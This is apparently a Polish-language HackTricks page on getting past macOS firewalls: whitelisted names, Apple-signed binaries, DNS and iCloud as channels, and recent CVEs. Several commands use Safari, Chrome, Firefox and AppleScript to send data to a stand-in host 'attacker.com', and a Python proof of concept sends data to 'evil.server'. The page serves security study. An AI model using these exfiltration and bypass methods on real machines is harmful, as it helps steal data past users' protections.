# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki zostały znalezione jako działające w niektórych aplikacjach zapory macOS.

### Wykorzystywanie nazw z białej listy

- Na przykład wywołując złośliwe oprogramowanie nazwami dobrze znanych procesów macOS, takich jak **`launchd`**

### Syntetyczne kliknięcie

- Jeśli zapora prosi użytkownika o pozwolenie, spraw, aby złośliwe oprogramowanie **kliknęło na zezwól**

### **Użyj binarek podpisanych przez Apple**

- Takich jak **`curl`**, ale także innych, takich jak **`whois`**

### Znane domeny Apple

Zapora może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. A iCloud może być używany jako C2.

### Ogólny bypass

Kilka pomysłów na próbę obejścia zapór

### Sprawdź dozwolony ruch

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie dozwolone domeny lub które aplikacje mają do nich dostęp.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Wykorzystywanie DNS

Rozwiązywanie DNS odbywa się za pomocą **`mdnsreponder`** podpisanej aplikacji, która prawdopodobnie ma pozwolenie na kontakt z serwerami DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Poprzez aplikacje przeglądarkowe

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Jeśli możesz **wstrzyknąć kod do procesu**, który ma prawo łączyć się z dowolnym serwerem, możesz obejść zabezpieczenia zapory:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Ostatnie luki w zabezpieczeniach zapory macOS (2023-2025)

### Obejście filtra treści internetowej (Czas ekranowy) – **CVE-2024-44206**
W lipcu 2024 roku Apple naprawił krytyczny błąd w Safari/WebKit, który zepsuł systemowy „Filtr treści internetowej” używany przez kontrolę rodzicielską Czasu ekranowego. 
Specjalnie skonstruowany URI (na przykład z podwójnym kodowaniem URL „://”) nie jest rozpoznawany przez ACL Czasu ekranowego, ale jest akceptowany przez WebKit, więc żądanie jest wysyłane bez filtracji. Każdy proces, który może otworzyć URL (w tym kod w piaskownicy lub niepodpisany), może zatem uzyskać dostęp do domen, które są wyraźnie zablokowane przez użytkownika lub profil MDM.

Praktyczny test (system bez poprawek):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Błąd kolejności reguł filtrów pakietów (PF) w wczesnym macOS 14 “Sonoma”
Podczas cyklu beta macOS 14 Apple wprowadziło regresję w przestrzeni użytkownika wokół **`pfctl`**. Reguły, które zostały dodane z użyciem słowa kluczowego `quick` (używanego przez wiele przełączników kill-switch VPN), były cicho ignorowane, co powodowało wycieki ruchu, nawet gdy GUI VPN/firewall zgłaszało *zablokowane*. Błąd został potwierdzony przez kilku dostawców VPN i naprawiony w RC 2 (build 23A344).

Szybkie sprawdzenie wycieku:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Wykorzystywanie usług pomocniczych podpisanych przez Apple (legacy – przed macOS 11.2)
Przed macOS 11.2 **`ContentFilterExclusionList`** pozwalał na ~50 binarnych plików Apple, takich jak **`nsurlsessiond`** i App Store, na ominięcie wszystkich zapór ogniowych filtrujących gniazda wdrożonych za pomocą frameworka Network Extension (LuLu, Little Snitch itp.).
Złośliwe oprogramowanie mogło po prostu uruchomić wykluczony proces — lub wstrzyknąć do niego kod — i tunelować swój własny ruch przez już dozwolone gniazdo. Apple całkowicie usunęło listę wykluczeń w macOS 11.2, ale technika ta jest nadal istotna w systemach, które nie mogą być zaktualizowane.

Przykład dowodu koncepcji (przed 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Wskazówki dotyczące narzędzi dla nowoczesnego macOS

1. Sprawdź aktualne zasady PF, które generują zapory GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Wymień binaria, które już mają uprawnienia *outgoing-network* (przydatne do podczepiania):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programowo zarejestruj własny filtr treści rozszerzenia sieciowego w Objective-C/Swift.
Minimalny rootless PoC, który przekazuje pakiety do lokalnego gniazda, jest dostępny w kodzie źródłowym **LuLu** Patricka Wardle’a.

## Odniesienia

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
